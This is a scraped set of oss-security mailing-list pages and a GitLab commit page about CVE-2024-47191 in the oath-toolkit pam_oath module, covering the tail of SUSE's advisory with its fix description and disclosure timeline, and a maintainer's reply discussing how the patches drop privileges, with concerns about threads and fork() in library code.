additional security measure. The locking mechanism has been fixed to cover all
accesses to the usersfile. Instead of creating a separate lockfile, the
usersfile itself is used for locking, which avoids cluttering the home
directory. Additional sanity checks are added e.g. world-writable directory
components are denied. The patch employs Linux specific features (e.g. linking
files from /proc/self/fd), thus it no longer works for non-Linux systems. The
patch description and code comments contain more hints about the individual
decisions taken in this patch.

Upstream Bugfix
===============

Upstream developed an alternative solution, designed to be more portable and
cross-platform. This does not take into account all aspects that we considered
in the "SUSE Bugfix", but should be sufficient to fix the specific security
issue described in this report.

This fix has been released in version 2.6.12 of oath-toolkit. Upstream has also
published an associated Security Advisory [4].

Timeline
========

2024-08-08: Fabian Vogt of SUSE sent an email to the main upstream author,
            describing the issue. The SUSE Security Team was involved as well.
2024-08-20: After not receiving any reply by email, we created a private
            GitLab issue [3] describing the vulnerability and offering
            coordinated disclosure.
2024-08-28: SUSE started developing an internal patch for the issue.
2024-09-19: Our internal patch was getting ready for publication. We added a
            comment in the private GitLab issue, granting two final weeks of
            embargo time before we will publish the vulnerability and the patch.
            We also shared the current patch in the issue.
2024-09-19: We requested a CVE for the issue from Mitre.
2024-09-20: Mitre assigned CVE-2024-47191.
2024-09-29: After being pinged via private channels, the main upstream author
            reacted to our communication and started preparing a bugfix release.
2024-10-04: Upstream published release 2.6.12 containing the bugfix.

[1]: <https://gitlab.com/oath-toolkit/oath-toolkit>
[2]: <https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a>
[3]: <https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43>
[4]: <https://www.nongnu.org/oath-toolkit/security/CVE-2024-47191/>
[5]: <https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>

Johannes
--
GPG Key                EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
SUSE Software Solutions Germany GmbH, Frankenstraße 146, 90461 Nürnberg, Germany
Geschäftsführer: Ivo Totev, Andrew McDonald, Werner Knoblich (HRB 36809, AG Nürnberg)

View attachment "[0001-usersfile-fix-potential-security-issues-in-PAM-modul.patch](2/1)" of type "text/x-patch" (28797 bytes)

Download attachment "[signature.asc](2/2)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_5cbabdc7_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](1) [[thread-next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <878quzt99y.fsf@kaka.sjd.se>
Date: Tue, 08 Oct 2024 08:10:17 +0200
From: Simon Josefsson <simon@...efsson.org>
To: Solar Designer <solar@...nwall.com>
Cc: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

Solar Designer <solar@...nwall.com> writes:

> This link requires authentication.  I guess you meant to post:
>
> <https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418>

Fixed, thank you!  The writeup is available here:

<https://www.nongnu.org/oath-toolkit/CVE-2024-47191.html>

> I note a few things:
>
> 1. Neither the SUSE nor the upstream patches change the supplementary
> groups.  SUSE patches fork() and then in the child setgid() and
> setuid().  Upstream doesn't fork(), but switches with setegid() and
> seteuid(), and then back.  If the intent is solely to avoid the need for
> fchown(), then that's sufficient.  Hopefully, along with SUSE's openat()
> and flags magic or with upstream's fopen(, "x"), nothing more is needed.
> However, if the intent is to avoid even trying to access files in user's
> directory with potentially excessive privileges, then supplementary
> groups should also be switched or dropped.
>
> I'm sorry I didn't get around to bringing this maybe-issue up in the
> pre-disclosure thread on the distros list (which Johannes Segitz from
> SUSE kindly started on September 27).  I feel it was not essential to
> discuss/address pre-disclosure, and is fine to discuss in public now.

Thanks for review and mentioning this!  I added some comments:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/47>

I noticed that that there are Linux-PAM helpers to drop privileges:

<https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_modutil_priv.c#L52>

I have found another implementation of this in yubico-pam:

<https://github.com/Yubico/yubico-pam/blob/master/drop_privs.c>

> 2. Switching task credentials from library code is tricky, given that
> the program could have threads that don't expect this.  set*id() and
> setgroups() libc calls would typically affect all threads.  On Linux,
> it's possible to affect the current thread only, which e.g. we do in
> tcb[1] by using setfs*id() and direct setgroups() syscall (the latter
> only in our recent git code at this time, previously we used the libc
> function).  I assume Simon is aware of the Linux specific way, but
> deliberately chose not to do this in upstream oath-toolkit for
> portability to non-Linux.
>
> [1] <https://www.openwall.com/tcb/> and <https://github.com/openwall/tcb>

Thanks for the pointer!  Yes, even the mild use of POSIX APIs in liboath
usersfile.c causes portability problems today, so I would like to avoid
adding more and ideally even remove the current usersfile stuff since it
doesn't belong in the core HOTP/TOTP library.

The thread concern is worrying though, but I'm hoping usage of this API
is not that widespread in any threaded applications.

> 4. As Simon also noted:
>
>> SUSE's alternative patch and advisory can be found via:
>>
>> <https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>
>>
>> It rely on Linux kernel specific features and uses fork() which was
>> determined to be contrary to the liboath design, which aims to be
>> portable to macOS and *BSD and beyond.
>
> I agree fork() from library code is tricky, but not so much because of
> portability concerns.

Making fork() work on Windows from within a library is not that fun.

> Again, the program using the library may not expect it to ever have an
> extra child process.  Sure the library should use waitpid() on this
> specific process, yet the program could receive unexpected SIGCHLD.
> The combination of the program's threads and our fork() could also
> have unexpected consequences.
>
> In tcb, we chose to make usage of fork() a PAM module option, so that by
> enabling it the distro or sysadmin acknowledges that it's acceptable in
> the specific PAM configuration.  Our usage of fork() is for a different
> reason, though: "Using this option one can be sure that after a call to
> pam_end(3) there is no sensitive data left in the process' address
> space."  I wonder if this property would also be relevant in
> oath-toolkit patches if more processing is moved to the child process,
> or if this would be excessive under the relevant threat models.

Nice catch, I've opened an issue about this aspect:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/48>

Btw, do you have any thoughts on WHICH user to drop privileges to?  The
SUSE patch drops privs to the credential file owner.  My patch drops
privs to the PAM user that is being authenticated.  I think there are
reasonable arguments for both choices, and for all reasonable
configurations that I'm aware of, I don't think the choice matters.

/Simon

Download attachment "[signature.asc](2/1)" of type "application/pgp-signature" (256 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from gitlab.com_a5fc095d_20250111_133257.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Unverified
**Commit
95ef255e**

authored
Oct 03, 2024
by
**[![Simon Josefsson's avatar](https://secure.gravatar.com/avatar/bbcf4eaca84bcb1c3d191a2d8868291127d072e3ed2cc92e8b835d8a009020d8?s=96&d=identicon "Simon Josefsson")](/jas)
[Simon Josefsson](/jas)**

[Browse files](/oath-toolkit/oath-toolkit/-/tree/95ef255e6a401949ce3f67609bf8aac2029db418)

### pam\_oath: When usersfile contains ${HOME} drop privs to user.

parent
[7faba9b5](/oath-toolkit/oath-toolkit/-/commit/7faba9b50fa572b1e422dfebf1c98e34ef5fb524)

Loading

Loading

Loading

* [Changes
  1](/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418)

[Hide whitespace changes](/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418?action=show&controller=projects%2Fcommit&id=95ef255e6a401949ce3f67609bf8aac2029db418&namespace_id=oath-toolkit&project_id=oath-toolkit&w=1)
[Inline](/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418?view=inline)
[Side-by-side](/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment


